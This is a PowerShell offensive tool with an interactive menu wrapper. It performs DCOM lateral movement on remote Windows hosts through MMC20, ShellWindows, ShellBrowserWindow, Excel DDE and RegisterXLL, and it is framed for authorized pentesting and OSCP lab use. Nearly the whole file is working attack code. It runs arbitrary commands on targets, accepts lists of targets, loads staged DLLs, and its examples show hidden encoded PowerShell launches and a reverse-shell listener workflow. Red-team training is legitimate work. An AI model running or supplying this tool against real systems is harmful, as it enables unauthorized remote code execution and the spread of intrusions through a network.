<#
.SYNOPSIS
    DCOM lateral movement via COM objects over RPC (TCP 135). For authorized
    penetration testing and OSCP / PEN-200 lab use.

.DESCRIPTION
    Instantiates a COM object on a remote host and uses one of several documented
    execution methods to run a command there, in the context of the credentials
    your current session holds. Run FROM an elevated PowerShell on a Windows
    foothold; you must be a local administrator on the target.

    Execution is fire-and-forget for the shell-spawning methods: the command runs
    on the target but no output is returned over DCOM. Pair it with a reverse
    shell and have your listener ready.

    Methods:
      MMC20              MMC20.Application ExecuteShellCommand (most reliable)
      ShellWindows       explorer-hosted; needs an OPEN explorer window on target
      ShellBrowserWindow explorer-hosted; no window needed, Win8+/Server2012+ only
      ExcelDDE           Excel.Application DDEInitiate; requires Excel on target
      RegisterXLL        Excel.Application RegisterXLL; loads a DLL on the target

.PARAMETER ComputerName
    Target IP or hostname. Accepts pipeline input, so you can pipe a target list.

.PARAMETER Method
    Execution method (see DESCRIPTION). Defaults to MMC20.

.PARAMETER Command
    Program to run on the target (e.g. cmd, powershell, calc.exe).

.PARAMETER Arguments
    Arguments passed to Command (e.g. '/c whoami', '-nop -w hidden -e <b64>').

.PARAMETER DllPath
    For RegisterXLL only: path to a DLL already staged on the TARGET filesystem.

.EXAMPLE
    Invoke-DCOM -ComputerName 192.168.50.73 -Method MMC20 -Command cmd -Arguments '/c calc'

.EXAMPLE
    Invoke-DCOM -ComputerName files04 -Method MMC20 -Command powershell -Arguments '-nop -w hidden -e JABjAG...'

.EXAMPLE
    Get-Content targets.txt | Invoke-DCOM -Method MMC20 -Command cmd -Arguments '/c whoami' | Format-Table

.EXAMPLE
    Invoke-DCOM -ComputerName 192.168.50.73 -Method RegisterXLL -DllPath C:\Windows\Temp\beacon.xll

.OUTPUTS
    PSCustomObject with Target, Method, Success, ProcessId, ReturnValue, Message.

.NOTES
    Authorized testing only. Techniques documented by Matt Nelson (@enigma0x3,
    SpecterOps), Steve Borosh (@rvrsh3ll), and Philip Tsukerman / Cybereason.
    Covered in OffSec PEN-200 Module 24 (Lateral Movement in Active Directory).
#>

function Invoke-DCOM {
    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'High')]
    [OutputType([PSCustomObject])]
    param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [Alias('Target', 'IPAddress', 'Host')]
        [string[]] $ComputerName,

        [Parameter(Mandatory = $false, Position = 1)]
        [ValidateSet('MMC20', 'ShellWindows', 'ShellBrowserWindow', 'ExcelDDE', 'RegisterXLL')]
        [string] $Method = 'MMC20',

        [Parameter(Mandatory = $false, Position = 2)]
        [string] $Command = 'calc.exe',

        [Parameter(Mandatory = $false, Position = 3)]
        [string] $Arguments = '',

        [Parameter(Mandatory = $false, Position = 4)]
        [string] $DllPath = ''
    )

    begin {
        $CLSIDs = @{
            'ShellWindows'       = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
            'ShellBrowserWindow' = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        if ($Method -eq 'RegisterXLL' -and -not $DllPath) {
            throw "RegisterXLL requires -DllPath pointing to a DLL on the target."
        }
    }

    process {
        foreach ($target in $ComputerName) {

            # Build a result object up front so every path returns something consistent
            $result = [PSCustomObject]@{
                Target      = $target
                Method      = $Method
                Success     = $false
                ProcessId   = $null
                ReturnValue = $null
                Message     = ''
            }

            $actionDesc = if ($Method -eq 'RegisterXLL') { "RegisterXLL $DllPath" } else { "$Command $Arguments".Trim() }
            if (-not $PSCmdlet.ShouldProcess($target, "DCOM $Method : $actionDesc")) {
                $result.Message = 'Skipped (WhatIf)'
                Write-Output $result
                continue
            }

            $obj = $null
            try {
                Write-Verbose "[$target] Method=$Method"

                switch ($Method) {

                    'MMC20' {
                        $type = [Type]::GetTypeFromProgID('MMC20.Application.1', $target)
                        if (-not $type) { throw "Could not resolve MMC20.Application.1 on $target" }
                        $obj = [System.Activator]::CreateInstance($type)
                        $ret = $obj.Document.ActiveView.ExecuteShellCommand($Command, $null, $Arguments, '7')
                        $result.ProcessId   = $ret.ProcessId
                        $result.ReturnValue = $ret.ReturnValue
                    }

                    'ShellWindows' {
                        $type = [Type]::GetTypeFromCLSID($CLSIDs[$Method], $target)
                        $obj  = [System.Activator]::CreateInstance($type)
                        $item = $obj.Item()
                        if (-not $item) { throw "ShellWindows: no open explorer window on $target (try MMC20)" }
                        $item.Document.Application.ShellExecute($Command, $Arguments, 'C:\Windows\System32', $null, 0)
                    }

                    'ShellBrowserWindow' {
                        $type = [Type]::GetTypeFromCLSID($CLSIDs[$Method], $target)
                        $obj  = [System.Activator]::CreateInstance($type)
                        $obj.Document.Application.ShellExecute($Command, $Arguments, 'C:\Windows\System32', $null, 0)
                    }

                    'ExcelDDE' {
                        $type = [Type]::GetTypeFromProgID('Excel.Application', $target)
                        if (-not $type) { throw "Could not resolve Excel.Application on $target (Excel not installed?)" }
                        $obj = [System.Activator]::CreateInstance($type)
                        $obj.DisplayAlerts = $false
                        try { $obj.DDEInitiate('cmd', "/c $Command $Arguments") }
                        catch { Write-Verbose "[$target] DDEInitiate threw (expected) - command still dispatched" }
                    }

                    'RegisterXLL' {
                        $type = [Type]::GetTypeFromProgID('Excel.Application', $target)
                        if (-not $type) { throw "Could not resolve Excel.Application on $target (Excel not installed?)" }
                        $obj = [System.Activator]::CreateInstance($type)
                        $obj.Application.RegisterXLL($DllPath)
                    }
                }

                $result.Success = $true
                $result.Message = 'Dispatched (fire-and-forget; output does not return - check your listener)'
                Write-Verbose "[$target] dispatched OK"
            }
            catch {
                $result.Message = $_.Exception.Message
                Write-Warning "[$target] $($_.Exception.Message)"
            }
            finally {
                if ($obj) {
                    try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($obj) | Out-Null } catch {}
                }
            }

            Write-Output $result
        }
    }
}

function Invoke-DCOMInteractive {
    <#
    .SYNOPSIS
        Guided menu wrapper for Invoke-DCOM: prompts for target, method, command.
    .DESCRIPTION
        Asks for the target, then the method, then the command, and dispatches via
        Invoke-DCOM. Run from an elevated PowerShell on a foothold (local admin on
        the target). Fire-and-forget - have your listener ready.
    #>
    [CmdletBinding()]
    param()

    Write-Host ""
    Write-Host "=== Invoke-DCOM (interactive) ===" -ForegroundColor Cyan

    $target = Read-Host "Target IP or hostname"
    if (-not $target) { Write-Host "[!] Target is required." -ForegroundColor Red; return }

    $methods = @(
        @{ Key = '1'; Name = 'MMC20';              Desc = 'most reliable, admin + DCOM/135 only';       Needs = 'cmd' }
        @{ Key = '2'; Name = 'ShellWindows';       Desc = 'needs an OPEN explorer window on target';    Needs = 'cmd' }
        @{ Key = '3'; Name = 'ShellBrowserWindow'; Desc = 'no open window, Win8+/Server2012+ only';     Needs = 'cmd' }
        @{ Key = '4'; Name = 'ExcelDDE';           Desc = 'requires Excel installed on target';         Needs = 'cmd' }
        @{ Key = '5'; Name = 'RegisterXLL';        Desc = 'requires Excel + a DLL staged on target';    Needs = 'dll' }
    )
    Write-Host ""
    foreach ($m in $methods) { Write-Host ("  [{0}] {1,-19} {2}" -f $m.Key, $m.Name, $m.Desc) }
    Write-Host ""
    $choice = Read-Host "Method [1-5] (Enter for MMC20)"
    if (-not $choice) { $choice = '1' }
    $sel = $methods | Where-Object { $_.Key -eq $choice }
    if (-not $sel) { Write-Host "[!] Invalid selection." -ForegroundColor Red; return }

    $params = @{ ComputerName = $target; Method = $sel.Name }

    if ($sel.Needs -eq 'dll') {
        $dll = Read-Host "Path to DLL on the TARGET (e.g. C:\Windows\Temp\evil.xll)"
        if (-not $dll) { Write-Host "[!] DllPath is required for RegisterXLL." -ForegroundColor Red; return }
        $params['DllPath'] = $dll
    }
    else {
        $line = Read-Host "Command"
        if (-not $line) { Write-Host "[!] Command is required." -ForegroundColor Red; return }
        $parts = $line.Trim() -split '\s+', 2
        $params['Command'] = $parts[0]
        if ($parts.Count -gt 1) { $params['Arguments'] = $parts[1] }
    }

    Write-Host ""
    Write-Host "[*] Dispatching $($sel.Name) to $target ..." -ForegroundColor Cyan
    Invoke-DCOM @params | Format-List
}
